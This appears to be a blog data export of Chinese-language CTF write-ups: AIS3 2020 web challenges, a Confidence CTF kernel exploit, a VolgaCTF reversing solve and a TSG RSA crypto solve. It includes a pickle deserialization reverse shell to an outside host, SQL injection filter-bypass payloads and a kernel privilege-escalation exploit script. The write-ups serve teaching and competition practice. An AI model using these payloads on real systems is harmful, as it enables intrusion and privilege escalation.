pickle.loads，沒有任何檢查，所以直接 reverse shell 12345678910import osimport picklefrom base64 import *class Exploit: def __reduce__(self): return(os.system, (('bash -c \"bash -i &gt;&amp; /dev/tcp/1.2.3.4/9999 0&gt;&amp;1\"'),))ex = Exploit()print(b64decode(pickle.dumps(ex))) 1AIS3{7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.} Owl 這題網站在 https://turtowl.ais3.org/，首頁有登入頁面，他有個白色字寫 GUESS THE STUPID USERNAME / PASSWORD，猜 admin/admin 就登進去了，登進去後，又有個白色字按鈕寫 SHOW HINT，點下去就看到原始碼了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123&lt;?php if (isset($_GET['source'])) { highlight_file(__FILE__); exit; } // Settings ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); date_default_timezone_set('Asia/Taipei'); session_start(); // CSRF if (!isset($_SESSION['csrf_key'])) $_SESSION['csrf_key'] = md5(rand() * rand()); require_once('csrf.php'); $csrf = new Csrf($_SESSION['csrf_key']); if ($action = @$_GET['action']) { function redirect($path = '/', $message = null) { $alert = $message ? 'alert(' . json_encode($message) . ')' : ''; $path = json_encode($path); die(\"&lt;script&gt;$alert; document.location.replace($path);&lt;/script&gt;\"); } if ($action === 'logout') { unset($_SESSION['user']); redirect('/'); } else if ($action === 'login') { // Validate CSRF token $token = @$_POST['csrf_token']; if (!$token || !$csrf-&gt;validate($token)) { redirect('/', 'invalid csrf_token'); } // Check if username and password are given $username = @$_POST['username']; $password = @$_POST['password']; if (!$username || !$password) { redirect('/', 'username and password should not be empty'); } // Get rid of sqlmap kiddies if (stripos($_SERVER['HTTP_USER_AGENT'], 'sqlmap') !== false) { redirect('/', \"sqlmap is child's play\"); } // Get rid of you $bad = [' ', '/*', '*/', 'select', 'union', 'or', 'and', 'where', 'from', '--']; $username = str_ireplace($bad, '', $username); $username = str_ireplace($bad, '', $username); // Auth $hash = md5($password); $row = (new SQLite3('/db.sqlite3')) -&gt;querySingle(\"SELECT * FROM users WHERE username = '$username' AND password = '$hash'\", true); if (!$row) { redirect('/', 'login failed'); } $_SESSION['user'] = $row['username']; redirect('/'); } else { redirect('/', \"unknown action: $action\"); } } $user = @$_SESSION['user'];?&gt;&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;title&gt;🦉🦉🦉🦉&lt;/title&gt; &lt;meta charset='utf-8'&gt; &lt;link href=\"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\" rel=\"stylesheet\" id=\"bootstrap-css\"&gt; &lt;script src=\"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js\"&gt;&lt;/script&gt; &lt;script src=\"//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;?php if (!$user): ?&gt; &lt;div id=\"login\"&gt; &lt;h3 class=\"text-center text-white pt-5\"&gt;GUESS THE STUPID USERNAME / PASSWORD&lt;/h3&gt; &lt;div class=\"container\"&gt; &lt;div id=\"login-row\" class=\"row justify-content-center align-items-center\"&gt; &lt;div id=\"login-column\" class=\"col-md-6\"&gt; &lt;div id=\"login-box\" class=\"col-md-12\"&gt; &lt;form id=\"login-form\" class=\"form\" action=\"?action=login\" method=\"post\"&gt; &lt;input type=\"hidden\" name=\"csrf_token\" value=\"&lt;?= htmlentities($csrf-&gt;generate()) ?&gt;\"&gt; &lt;h3 class=\"text-center text-info\"&gt;🦉: \"Login to see cool things!\"&lt;/h3&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"name\" class=\"text-info\"&gt;Username:&lt;/label&gt;&lt;br&gt; &lt;input type=\"text\" name=\"username\" id=\"username\" class=\"form-control\"&gt;&lt;br&gt; &lt;label for=\"name\" class=\"text-info\"&gt;Password:&lt;/label&gt;&lt;br&gt; &lt;input type=\"text\" name=\"password\" id=\"password\" class=\"form-control\"&gt;&lt;br&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;input type=\"submit\" name=\"submit\" class=\"btn btn-info btn-md\" value=\"Login\"&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php else: ?&gt; &lt;h3 class=\"text-center text-white pt-5\"&gt;&lt;a style=\"color: white\" href=\"/?source\"&gt;SHOW HINT&lt;/a&gt;&lt;/h3&gt; &lt;div class=\"container\"&gt; &lt;div class=\"row justify-content-center align-items-center\"&gt; &lt;div class=\"col-md-6\"&gt; &lt;div class=\"col-md-12\"&gt; &lt;h3 class=\"text-center text-info\"&gt;Nothing&lt;/h3&gt; Hello, &lt;b&gt;&lt;?= htmlentities($user) ?&gt;&lt;/b&gt;, nothing here. &lt;a href=\"?action=logout\"&gt;Logout!&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php endif ?&gt;&lt;/body&gt; 就是 sqlite 的 SQL Injection，輸入的 username 會用 str_ireplace 過濾兩次，很好繞過，打 ///*** 就會被過濾成 /*，打 selselselectectect 就會被過濾成 select，所以寫個簡單的 script 自動轉換 payload 123456789101112131415161718import systable = { ' ': '/**/', '/*': '///***', '*/': '***///', 'union': 'unununionionion', 'select': 'selselselectectect', 'and': 'anananddd', 'or': 'ooorrr', 'where': 'whewhewhererere', 'from': 'frfrfromomom',}inp = sys.argv[1]for t,v in table.items(): inp = inp.replace(t, v)print(inp) 注意到 -- 還是沒辦法用，因為 -selselectect- 會被轉成空的，select 順序在 -- 前面會先被過濾掉，str_ireplace 是照著 list 一個個 replace 的，不過我們用 /* 就足夠了。 1'///******///unununionionion///******///selselselectectect///******///null,sql,null///******///frfrfromomom///******///sqlite_master///******///whewhewhererere///******///type='table'///******///limit///******///1///******///offset///******///0///*** 先挖 table，找到 CREATE TABLE garbage ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, value TEXT )，只有這個 garbage 和 users 1'///******///unununionionion///******///selselselectectect///******///null,name,null///******///frfrfromomom///******///garbage///******///limit///******///1///******///offset///******///0///*** 再挖 db 裡面，挖到有個 name 是 something good，挖他的 value 就看到 flag 了 1AIS3{4_ch1ld_15_4_curly_d1mpl3d_lun471c} Rhino 這題網站在 https://rhino.ais3.org/，robots.txt 可以看到東西 12345678910111213# RIP robots!User-agent: *Disallow: /Disallow: /index.htmlDisallow: /*.xmlDisallow: /recentDisallow: /assetsDisallow: /aboutDisallow: /*.jsDisallow: /*.jsonDisallow: /node_modulesDisallow: /flag.txt 然後這個網站看起來是用 express 架的然後放 jekyll 產的 blog，既然是 js project 先看個 package.json 123456789101112131415{ &quot;name&quot;: &quot;app&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;scripts&quot;: { &quot;start&quot;: &quot;node chill.js&quot;, &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot; }, &quot;author&quot;: &quot;djosix&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;dependencies&quot;: { &quot;cookie-session&quot;: &quot;^1.4.0&quot;, &quot;express&quot;: &quot;^4.17.1&quot; }} 然後就看到原始碼叫做 chill.js 123456789101112131415161718192021222324252627const express = require('express');const session = require('cookie-session');let app = express();app.use(session({ secret: \"I'm watching you.\"}));app.use('/', express.static('./'));app.get('/flag.txt', (req, res) =&gt; { res.setHeader('Content-Type', 'text/plain'); let n = req.session.magic; if (n &amp;&amp; (n + 420) === 420) res.sendFile('/flag'); else res.send('you are a sad person too');});app.get('*', function(req, res){ res.status(404).sendFile('404.html', { root: __dirname });});app.listen(process.env.PORT, '0.0.0.0'); 看起來只要讓他的 n &amp;&amp; (n + 420) === 420 就可以讀 flag 了，以前就很常看到 FB 上有人 po 一些 js 的梗圖說明 js 很古怪的行為，隨便看了幾張複習一下，就想到有浮點數誤差的問題，所以 n 設成 0.00000000000001 就可以了，n 是從 req.session.magic 抓的，所以我們要設 req.session.magic 的話，最簡單的方式就是自己把 server 架起來，然後多加一行 req.session.magic = 0.00000000000001，就可以產出 express:sess 和 express:sess.sig 兩個 Cookie 了，sig 是用前面設定的 secret: &quot;I'm watching you.&quot; 算出來的，詳情可以看 cookie-session。 1AIS3{h4v3_y0u_r34d_7h3_rh1n0_b00k?}","link":"/2020/06/09/security/writeups/ais3-2020-preexam/"},{"title":"【Writeups】Teaser Confidence CTF Quals 2019 - p4fmt","text":"Kernel challs are always a bit painful. No internet access, no SSH, no file copying. You’re stuck with copy pasting base64’d (sometimes static) ELFs. But what if there was another solution? We’ve created a lightweight, simple binary format for your pwning pleasure. It’s time to prove your skills. nc p4fmt.zajebistyc.tf 30002 分數 解題人數 304 10 Writeup 題目檔案解壓縮後有三個檔案 bzImage, initramfs.cpio.gz, run.sh bzImage 是壓縮過的 linux kernel initramfs.cpio.gz 是臨時的檔案系統 run.sh 裡面用 qemu-system-x86_64 把 kernel 跑起來 不熟悉 linux kernel debug 可以參考 Debug Kernel First Glance run.sh 跑起來後就會跑 linux kernel 彈出一個 shell ls 一下可以看到三個比較重要的檔案 init, p4fmt.ko, flag 直接嘗試 cat flag 會得到 Permission denied 因為我們拿到的使用者是 pwn 而 flag 只有 root 有權限讀 init 裡面有一行 insmod /p4fmt.ko 加載 p4fmt.ko 這個內核模塊 看來我們的目標就是利用 p4fmt.ko 裡面的漏洞提權拿 root 權限，就可以 cat flag 了 前置作業 解壓 initramfs.cpio.gz 可以先用 binwalk 把 initramfs.cpio.gz 的檔案系統拉出來 12x initramfs.cpio.gzbinwalk -e initramfs.cpio 修改 init 1setsid cttyhack su root 修改 init 讓我們有 root 權限，這樣才看得到 p4fmt.ko 內核模塊載入後的位址，等等才方便下斷點 修改完重新打包 initramfs.cpio.gz 1find . -print0 | cpio --null --create --format=newc | gzip --best &gt; ../initramfs.cpio.gz 修改 run.sh 1-gdb tcp:127.0.0.1:6666 開了 gdb server 後，就可以用 gdb 連上去 debug 了 首先先取得 p4fmt 內核模塊的位址 可以用 lsmod 或 cat /proc/modules ( 必須有 root 權限 ) gdb123(gdb) target remote :6666(gdb) add-symbol-file p4fmt.ko 0xffffffffc0288000(gdb) b load_p4_binary # 這是 p4fmt 主要的函式等等逆向會看到 \"取得 p4fmt 位址\"1234/ # lsmodp4fmt 16384 0 - Live 0xffffffffc0288000 (O)/ # cat /proc/modulesp4fmt 16384 0 - Live 0xffffffffc0288000 (O) 逆向 起手式一樣 IDA 打開 ( 好像很多人改用 ghidra 了 O_O ) 但是這次的反編譯有點糟，大部分還是看組語配 gdb 這個內核模塊主要的功能就是註冊一個新的執行檔格式 ( binary format ) 1234567int __init p4fmt_init (void) { _register_binfmt(&amp;p4format, 1);}void __exit p4fmt_init (void) { unregister_binfmt(&amp;p4format);} p4format 是一個 linux_binfmt 的結構 12345678struct linux_binfmt { struct list_head lh; struct module *module; int (*load_binary)(struct linux_binprm *); int (*load_shlib)(struct file *); int (*core_dump)(struct coredump_params *cprm); unsigned long min_coredump; /* minimal dump size */} __randomize_layout; 其中的 load_binary 這個指標就是指向負責建立環境把程式跑起來的函式 而在這裡就是指向 load_p4_binary 這個函式 ( 一般的 ELF 執行檔是 load_elf_binary ) 123int load_p4_binary (linux_binprm *bprm) { ...} linux_binprm 會先讀檔案的前 128 bytes 放進 bprm-&gt;buf 因為有這個結構有 __randomize_layout，所以結構成員的順序是隨機的 這題的 bprm-&gt;buf 從 0x48 開始 128 bytes，可見下圖 程式一開始會先檢查前兩個 bytes 是不是 P4 接著檢查第三個 byte 是不是 \\x00，不是的話會噴 Unknown version 接著第四個 byte 可以是 \\x00 或 \\x01，\\x00 的話會進簡單的路線，\\x01 會進複雜的路線 接著四個 bytes 代表後面有幾個 mapping 接著八個 bytes 代表 mapping 的開頭在 buf 的 offset 接著八個 bytes 擺的是 entry point 的位址 其他的部分基本上跟 load_elf_binary 一樣 simple1vm_mmap(bprm-&gt;file, *(QWORD *)(bprm + 0x50), 0x1000, *(QWORD *)(bprm + 0x50) &amp; 7, 2, 0); complex123456789101112131415161718192021222324252627struct p4_mapping { long load_addr; long length; long offset;};int mapping_count = *(int *)(bprm-&gt;buf + 4);long mapping_offset = *(long *)(bprm-&gt;buf + 8);p4_mapping *mapping = bprm-&gt;buf + mapping_offset;for (int i = 0; i &lt; mapping_count; i++, mapping++) { long addr = mapping-&gt;load_addr &amp; 0xFFFFFFFFFFFFF000; long prot = mapping-&gt;load_addr &amp; 7; printk(\"vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)\\n\", addr, mapping-&gt;length, mapping-&gt;offset, prot); if (mapping-&gt;load_addr &amp; 8) { // 這裡就是要初始化一段記憶體，類似 .bss 段 vm_mmap(0, addr, mapping-&gt;length, prot, 2, mapping-&gt;offset); printk(\"clear_user(addr=0x%llx, length=0x%llx)\\n\", mapping-&gt;load_addr, mapping-&gt;length); _clear_user(mapping-&gt;load_addr, mapping-&gt;length); } else { // 這裡是要把檔案掛上去，類似 .text 段 vm_mmap(bprm-&gt;file, addr, mapping-&gt;length, prot, 2, mapping-&gt;offset); }} 漏洞 mapping_count 改大可以 leak linux_binprm 其他欄位的值 _clear_user 沒有檢查，可以把 kernel 上任意位址的值清空 linux_binprm 有一個 cred 的結構，裡面存的就是 uid, gid 所以我們只要 leak 出這個 cred 的位址，然後用 _clear_user 清成 0，我們的程式就是 root 權限了 ( root 的 uid 是 0 ) 嘗試 1234567891011121314151617181920212223#!/usr/bin/env python3from pwn import *from base64 import b64encodecontext.arch = \"amd64\"payload = b\"P4\" # magicpayload += p8(0) # versionpayload += p8(1) # typepayload += p32(1) # mapping_countpayload += p64(0x18) # mapping_offsetpayload += p64(0x400030) # entry# mappingpayload += flat( 0x400000 | 7, 0x1000, 0)payload += asm(shellcraft.echo(\"test\\n\") + shellcraft.exit())print(f'echo {b64encode(payload).decode()} | base64 -d &gt; a ; chmod +x a ; ./a') 先寫個簡單的 p4 格式的執行檔測試一下我們的理解是不是對的 command1echo UDQAAQEAAAAYAAAAAAAAADAAQAAAAAAABwBAAAAAAAAAEAAAAAAAAAAAAAAAAAAASLgBAQEBAQEBAVBIuHVkcnULAQEBSDEEJGoBWGoBX2oFWkiJ5g8FajxYDwU= | base64 -d &gt; a ; chmod +x a ; ./a output12[50353.170813] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)test 接下來要找 cred 的位址，因為 pwn 的 uid 是 1000 ( = 0x3e8 ) 所以我們把使用者切換成 pwn，切成 pwn 之後要在 /tmp 才可以寫檔 然後把 mapping_count 改大一點，比如 6，在他印出的位址指向的值中找 0x3e8 12345678[50800.668734] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)[50800.674080] vm_mmap(load_addr=0x10101010101b000, length=0x726475b848500101, offset=0x431480101010b75, prot=0)[50800.674550] clear_user(addr=0x10101010101b848, length=0x726475b848500101)[50800.675372] vm_mmap(load_addr=0x6a5f016a58016000, length=0x6a050fe689485a05, offset=0x50f583c, prot=4)[50800.675786] vm_mmap(load_addr=0x0, length=0x0, offset=0x0, prot=0)[50800.676003] vm_mmap(load_addr=0x0, length=0x7fffffffef99, offset=0x100000001, prot=0)[50800.676260] vm_mmap(load_addr=0x0, length=0xffffa1c307595b40, offset=0x0, prot=0)test 找了一找發現在第六個 vm_mmap 的 0xffffa1c307595b40 這個位址是 cred 但是這個位址每次跑起來都不一樣，不過多跑幾次會發現，這個值會一直循環重複利用，所以只要多跑幾次就會對了 Final Exploit 1234567891011121314151617181920212223242526272829#!/usr/bin/env python3from pwn import *from base64 import b64encodecontext.arch = \"amd64\"payload = b\"P4\" # magicpayload += p8(0) # versionpayload += p8(1) # typepayload += p32(2) # mapping_countpayload += p64(0x18) # mapping_offsetpayload += p64(0x400048) # entryleak_cred = 0xffff9855c758c0c0# mappingpayload += flat( 0x400000 | 7, 0x1000, 0, (leak_cred | 8) + 0x10, 0x20, 0)payload += asm(shellcraft.cat(\"/flag\") + shellcraft.exit())print(f'echo {b64encode(payload).decode()} | base64 -d &gt; a ; chmod +x a ; ./a') https://github.com/david942j/ctf-writeups/tree/master/teaser-confidence-quals-2019/p4fmt https://devcraft.io/2019/03/19/p4fmt-confidence-ctf-2019-teaser.html https://amritabi0s.wordpress.com/2019/03/19/confidence-ctf-p4fmt-write-up/","link":"/2019/04/26/security/writeups/p4fmt/"},{"title":"【Writeups】VolgaCTF Quals 2020 - F-Hash","text":"這題給了一個 x86-64 ELF Executable，直接跑下去跑不出來，一直卡在那裡，逆向一下會發現 13B0 這個函式是一個遞迴函式，他的虛擬碼大概長下面這樣，會一直遞迴呼叫前兩層的答案，很明顯的有很多重複的子問題，這時候就是要用 Dynamic Programming 的思路來把算過的答案記下來就不會跑那麼久了，所以這題就是要優化這個函式，把程式跑完就會印出 flag。 12345def _13B0(depth, a, b): ... r1 = _13B0(depth - 1, a, b) r2 = _13B0(depth - 2, a, b) ... 以下提供三種解法，讀者可以跟著練習一下。 Rewrite Function with Python 最直覺的方法就是把 IDA decompile 出來的 code 搬到 python 上重寫一下，沒什麼技術，這是我在賽中用的方法，但就是要注意一下型態的問題，比如兩個 unsigned int 相乘可能 overflow 在 python 裡面要 mod (1 &lt;&lt; 32)，更多細節請看下面的程式碼。 solve-rewrite.py123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python3table = [0]for i in range(26): table += [i * 10 + 1 + (0xf6 &lt;&lt; 120)] * 10def bitcountsum(a, b): a %= (1 &lt;&lt; 64) b %= (1 &lt;&lt; 64) return bin(a).count('1') + bin(b).count('1')def calc(a, b, depth = 256): ans = [0] ans.append((bitcountsum(a, b), 0, 0)) ans.append((bitcountsum(a ^ 1, b), 0, 1)) for i in range(3, depth + 1): v15, v16 = ans[i - 1], ans[i - 2] v13 = ((v15[0] + v15[1] * (1 &lt;&lt; 64)) + (v16[0] + v16[1] * (1 &lt;&lt; 64)) + bitcountsum((v15[2] + v16[2]) ^ a, b)) % (1 &lt;&lt; 128) v14 = table[i] while True: if (v14 &gt;&gt; 64) &gt; (v13 &gt;&gt; 64): break if (v14 &gt;&gt; 64) == (v13 &gt;&gt; 64): if v14 % (1 &lt;&lt; 64) &gt;= v13 % (1 &lt;&lt; 64): break k = max(1, (v13 &gt;&gt; 64) // (v14 &gt;&gt; 64)) v13 = (v13 - k * v14) % (1 &lt;&lt; 128) ans.append((v13 % (1 &lt;&lt; 64), (v13 &gt;&gt; 64), (v15[2] + v16[2]) % (1 &lt;&lt; 64))) return ansal = [0x6369757120656854, 0x706d756a20786f66, 0x20797a616c206568, 0]bl = [0x206e776f7262206b, 0x74207265766f2073, 0x80676f64, 0x2b]for a, b in zip(al, bl): print(list(map(hex, calc(a, b)[256]))) GDB 另一個方法是我在賽後看 別人 用的，在 gdb 寫 python 去 hook 13B0 的開頭和結尾，在開頭判斷這組參數有沒有出現過了，跑過就把參數的 depth 設成 1 也就是 base case 讓他不要再往下遞迴了，而因為同一組函式的 Start, End Hook 沒辦法共享資訊，所以需要維護一個 state 來放目前的參數，在結尾的時候一樣是看這組參數有沒有出現過，有就把答案寫上去，沒有就把答案存起來下次就不會再跑一次了。 solve-gdb.py12345678910111213141516171819202122232425262728293031323334353637383940import gdbdef register(name): return int(gdb.parse_and_eval(name))def read(address, size): inf = gdb.inferiors()[0] return inf.read_memory(address, size).tobytes()def write(address, buf): inf = gdb.inferiors()[0] inf.write_memory(address, buf)memory = {}state = []class Start(gdb.Breakpoint): def __init__(self, location): super(Start, self).__init__(spec = location, type = gdb.BP_BREAKPOINT, internal = False, temporary = False) def stop(self): state.append((register('$rdi'), register('$rsi'), register('$rdx'), register('$rcx'))) if memory.get(state[-1][1:]) is not None: gdb.execute('set $rsi = 1')class End(gdb.Breakpoint): def __init__(self, location): super(End, self).__init__(spec = location, type = gdb.BP_BREAKPOINT, internal = False, temporary = False) def stop(self): global state buf, h = state[-1][0], state[-1][1:] if memory.get(h) is None: memory[h] = (read(buf, 8), read(buf + 8, 8), read(buf + 16, 8)) else: write(buf, memory[h][0]) write(buf + 8, memory[h][1]) write(buf + 16, memory[h][2]) state = state[:-1]Start(f'*{0x0000555555554000 + 0x13b0}')End(f'*{0x0000555555554000 + 0x1424}') gdb f-hash 之後，在 gdb 裡面執行 source solve-gdb.py 就可以跑上面的程式碼了 或是也可以在執行 gdb 的時候就載入 gdb -x solve-gdb.py f-hash Frida 這個方法也是我賽後看 別人 用的，frida 真的是好東西，之前剛好有研究一點 frida，第一次用在比賽中，基本上跟前一個解法一樣去 hook 函式的開頭和結尾，不過 frida 又更方便了，請看下面程式碼。 solve-frida.js12345678910111213141516171819202122var base = ptr(Process.enumerateModulesSync()[0].base)var recursive_func_ptr = base.add(0x13b0)var mem = {}Interceptor.attach(recursive_func_ptr, { onEnter: function (args) { this.buf = args[0] this.hash = args[1] + '-' + args[2] + '-' + args[3] if (mem[this.hash] !== undefined) { args[1] = ptr(1) } }, onLeave: function (retval) { if (mem[this.hash] === undefined) { mem[this.hash] = [this.buf.readU64(), this.buf.add(8).readU64(), this.buf.add(16).readU64()] } else { this.buf.writeU64(mem[this.hash][0]) this.buf.add(8).writeU64(mem[this.hash][1]) this.buf.add(16).writeU64(mem[this.hash][2]) } }}) 最後執行 frida --no-pause --runtime=v8 -l solve-frida.js ./f-hash 就可以了 Flag 1VolgaCTF{16011432ba16efc8dcf779477985b3b9} https://github.com/OAlienO/CTF/tree/master/2020/VolgaCTF/F-Hash https://pastebin.com/Dj6wteXk https://sectt.github.io/writeups/Volga20/f-hash/README","link":"/2020/05/04/security/writeups/f-hash/"},{"title":"【Writeups】TSG CTF 2019 - OPQRX","text":"Can you decrypt RSA? I’ll give a hint value, XOR. ここにRSAの暗号文がありますが、XORをあげるので、代わりに平文をください。 分數 解題人數 497 10 Writeups 題目很簡單，RSA 加密，多給了 $p \\oplus q$ 的值 $$ \\begin{align} &amp;p \\oplus q = x \\\\ &amp;p \\times q = n \\\\ \\end{align} $$ 已知 $x, n$ 求 $p, q$ 假設 $x$ 的第一個 bit 是 0，那麼 $p, q$ 的第一個 bit 只有 $(0, 0)$ 或 $(1, 1)$ 兩種可能 假設 $x$ 的第一個 bit 是 1，那麼 $p, q$ 的第一個 bit 只有 $(0, 1)$ 或 $(1, 0)$ 兩種可能 所以就直接爆搜加剪枝就過了，驚不驚喜，意不意外 Final Exploit 12345678910111213141516171819202122232425262728293031323334#!/usr/bin/env python3from Crypto.Util.number import *from tqdm import tqdmclass Solver: def __init__(self, x, n): self.x = x self.n = n self.pq = [(0, 0)] def add(self, b, p, q): if p * q &lt;= n and (p | (b - 1)) * (q | (b - 1)) &gt;= n: self.pq.append((p, q)) def solve(self): for shift in tqdm(range(4095, -1, -1)): b = 1 &lt;&lt; shift pq, self.pq = self.pq, [] for p, q in pq: if self.x &amp; b: self.add(b, p | b, q) self.add(b, p, q | b) else: self.add(b, p, q) self.add(b, p | b, q | b) return self.pq[0]exec(open('flag.enc').read().lower())solver = Solver(x, n)p, q = solver.solve()r = (p - 1) * (q - 1)d = inverse(e, r)m = pow(c, d, n)print(long_to_bytes(m)) Flag 1TSGCTF{Absolutely, X should be 'S' in 'OPQRX'.} https://furutsuki.hatenablog.com/entry/2019/05/05/163313#Crypto-497pts-10-Solves-OPQRX","link":"/2019/05/06/security/writeups/opqrx/"}],"tags":[{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"icarus","slug":"icarus","link":"/tags/icarus/"},{"name":"seo","slug":"seo","link":"/tags/seo/"},{"name":"security","slug":"security","link":"/tags/security/"},{"name":"LINE TAXI","slug":"LINE-TAXI","link":"/tags/LINE-TAXI/"},{"name":"netflix","slug":"netflix","link":"/tags/netflix/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"pyc","slug":"pyc","link":"/tags/pyc/"},{"name":"ssh","slug":"ssh","link":"/tags/ssh/"},{"name":"tunnel","slug":"tunnel","link":"/tags/tunnel/"},{"name":"command","slug":"command","link":"/tags/command/"},{"name":"proxy","slug":"proxy","link":"/tags/proxy/"},{"name":"reverse ssh","slug":"reverse-ssh","link":"/tags/reverse-ssh/"},{"name":"iterm2","slug":"iterm2","link":"/tags/iterm2/"},{"name":"zsh","slug":"zsh","link":"/tags/zsh/"},{"name":"zimfw","slug":"zimfw","link":"/tags/zimfw/"},{"name":"powerlevel9k","slug":"powerlevel9k","link":"/tags/powerlevel9k/"},{"name":"powerlevel10k","slug":"powerlevel10k","link":"/tags/powerlevel10k/"},{"name":"nord","slug":"nord","link":"/tags/nord/"},{"name":"algorithm","slug":"algorithm","link":"/tags/algorithm/"},{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"srop","slug":"srop","link":"/tags/srop/"},{"name":"reverse","slug":"reverse","link":"/tags/reverse/"},{"name":"android","slug":"android","link":"/tags/android/"},{"name":"adb","slug":"adb","link":"/tags/adb/"},{"name":"nox","slug":"nox","link":"/tags/nox/"},{"name":"burp","slug":"burp","link":"/tags/burp/"},{"name":"drony","slug":"drony","link":"/tags/drony/"},{"name":"rootkit","slug":"rootkit","link":"/tags/rootkit/"},{"name":"osint","slug":"osint","link":"/tags/osint/"},{"name":"frida","slug":"frida","link":"/tags/frida/"},{"name":"news","slug":"news","link":"/tags/news/"},{"name":"writeups","slug":"writeups","link":"/tags/writeups/"},{"name":"blockchain","slug":"blockchain","link":"/tags/blockchain/"},{"name":"kernel","slug":"kernel","link":"/tags/kernel/"},{"name":"gdb","slug":"gdb","link":"/tags/gdb/"},{"name":"crypto","slug":"crypto","link":"/tags/crypto/"},{"name":"rsa","slug":"rsa","link":"/tags/rsa/"}],"categories":[{"name":"algorithm","slug":"algorithm","link":"/categories/algorithm/"},{"name":"security","slug":"security","link":"/categories/security/"},{"name":"reverse","slug":"security/reverse","link":"/categories/security/reverse/"},{"name":"pwn","slug":"security/pwn","link":"/categories/security/pwn/"},{"name":"osint","slug":"security/osint","link":"/categories/security/osint/"},{"name":"news","slug":"security/news","link":"/categories/security/news/"},{"name":"writeups","slug":"security/writeups","link":"/categories/security/writeups/"}]}